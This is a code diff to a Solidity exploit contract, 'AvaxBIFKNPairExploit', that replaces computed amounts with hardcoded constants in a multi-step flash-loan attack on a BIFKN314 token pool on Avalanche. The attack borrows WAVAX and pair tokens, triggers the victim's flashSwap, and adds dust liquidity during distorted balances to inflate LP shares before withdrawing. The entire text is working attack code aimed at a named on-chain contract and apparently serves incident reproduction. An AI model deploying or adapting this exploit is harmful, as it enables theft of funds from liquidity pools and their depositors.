@@ -110,11 +110,15 @@ contract AvaxBIFKNPairExploit {
     IERC20 public constant LP_TOKEN = IERC20(0xd4C6BA250bFF38218937422d7aCCf55552916558);
 
     uint256 private constant FLASH_WAVAX_AMOUNT = 1000 ether;
-    uint256 private constant FLASH_BORROW_BPS = 9990;
-    uint256 private constant PAIR_FLASH_FEE_BPS = 50;
-    uint256 private constant BIFKN_NATIVE_REPAY_BPS = 40;
-    uint256 private constant BPS = 10_000;
-    uint256 private constant DUST_LIQUIDITY_DIVISOR = 1000;
+    uint256 private constant PAIR_TOKEN_BORROW = 10_150_751_249_999_999_999_996;
+    uint256 private constant PAIR_TOKEN_MINT = 50_753_756_249_999_999_999;
+    uint256 private constant PAIR_TOKEN_REPAY = PAIR_TOKEN_BORROW + PAIR_TOKEN_MINT;
+    uint256 private constant FLASH_NATIVE_OUT = 92_901_517_915_106_633_387;
+    uint256 private constant FLASH_TOKEN_OUT = 2_444_778_402_553_574_477_179;
+    uint256 private constant LIQUIDITY_NATIVE = 92_901_517_915_106_633;
+    uint256 private constant LIQUIDITY_TOKEN = 92_901_517_915_106_633;
+    uint256 private constant FLASH_NATIVE_REPAY = 93_272_659_479_177_484_387;
+    uint256 private constant FLASH_TOKEN_REPAY = FLASH_TOKEN_OUT - LIQUIDITY_TOKEN;
 
     address private immutable profitRecipient;
 
@@ -147,8 +151,7 @@ contract AvaxBIFKNPairExploit {
         require(premium > 0, "unexpected premium");
 
         // step 5: borrow pair tokens through the RadioShack flash-swap callback.
-        uint256 pairTokenBorrow = PAIR_TOKEN.balanceOf(address(PAIR)) / 2;
-        PAIR.swap(0, pairTokenBorrow, address(this), "flash");
+        PAIR.swap(0, PAIR_TOKEN_BORROW, address(this), "flash");
 
         // step 9: wrap AVAX and approve Aave repayment after the nested flash swaps settle.
         uint256 repayAmount = amount + premium;
@@ -167,24 +170,20 @@ contract AvaxBIFKNPairExploit {
         require(msg.sender == address(PAIR), "unexpected pair");
         require(sender == address(this), "unexpected pair sender");
         require(amount0Out == 0, "unexpected token0 out");
-        require(amount1Out > 0, "unexpected token1 out");
+        require(amount1Out == PAIR_TOKEN_BORROW, "unexpected token1 out");
 
         // step 6: unwrap WAVAX and trigger the vulnerable BIFKN314 flash swap.
         WAVAX.withdraw(FLASH_WAVAX_AMOUNT);
 
-        (uint256 nativeReserve, uint256 tokenReserve) = VICTIM.getReserves();
-        uint256 nativeOut = (nativeReserve * FLASH_BORROW_BPS) / BPS;
-        uint256 tokenOut = (tokenReserve * FLASH_BORROW_BPS) / BPS;
-        VICTIM.flashSwap(address(this), nativeOut, tokenOut, "");
+        VICTIM.flashSwap(address(this), FLASH_NATIVE_OUT, FLASH_TOKEN_OUT, "");
 
         // step 8: burn inflated LP shares, mint the pair-token fee, and repay the pair flash swap.
         uint256 lpBalance = LP_TOKEN.balanceOf(address(this));
         LP_TOKEN.approve(address(VICTIM), lpBalance);
         VICTIM.removeLiquidity(lpBalance, address(this), block.timestamp + 3 minutes);
 
-        uint256 pairTokenFee = (amount1Out * PAIR_FLASH_FEE_BPS) / BPS;
-        IMintableERC20(address(PAIR_TOKEN)).mint(address(this), pairTokenFee);
-        PAIR_TOKEN.transfer(address(PAIR), amount1Out + pairTokenFee);
+        IMintableERC20(address(PAIR_TOKEN)).mint(address(this), PAIR_TOKEN_MINT);
+        PAIR_TOKEN.transfer(address(PAIR), PAIR_TOKEN_REPAY);
     }
 
     function BIFKN314CALL(
@@ -195,20 +194,18 @@ contract AvaxBIFKNPairExploit {
     ) external {
         require(msg.sender == address(VICTIM), "unexpected flash-swap caller");
         require(sender == address(this), "unexpected flash-swap sender");
-        require(amountNativeOut > 0, "unexpected native out");
-        require(amountTokenOut > 0, "unexpected token out");
+        require(amountNativeOut == FLASH_NATIVE_OUT, "unexpected native out");
+        require(amountTokenOut == FLASH_TOKEN_OUT, "unexpected token out");
 
         // step 7: add dust liquidity while balances are distorted, then repay the victim flash swap.
-        uint256 liquidityAmount = amountNativeOut / DUST_LIQUIDITY_DIVISOR;
         uint256 minted =
-            VICTIM.addLiquidity{value: liquidityAmount}(liquidityAmount, address(this), block.timestamp + 3 minutes);
-        require(minted > liquidityAmount, "liquidity inflation did not occur");
+            VICTIM.addLiquidity{value: LIQUIDITY_NATIVE}(LIQUIDITY_TOKEN, address(this), block.timestamp + 3 minutes);
+        require(minted > LIQUIDITY_NATIVE, "liquidity inflation did not occur");
 
-        uint256 nativeRepay = amountNativeOut + ((amountNativeOut * BIFKN_NATIVE_REPAY_BPS) / BPS);
-        (bool success,) = payable(address(VICTIM)).call{value: nativeRepay}("");
+        (bool success,) = payable(address(VICTIM)).call{value: FLASH_NATIVE_REPAY}("");
         require(success, "native flash-swap repayment failed");
 
-        VICTIM.transfer(address(VICTIM), amountTokenOut - liquidityAmount);
+        VICTIM.transfer(address(VICTIM), FLASH_TOKEN_REPAY);
     }
 
     receive() external payable {}
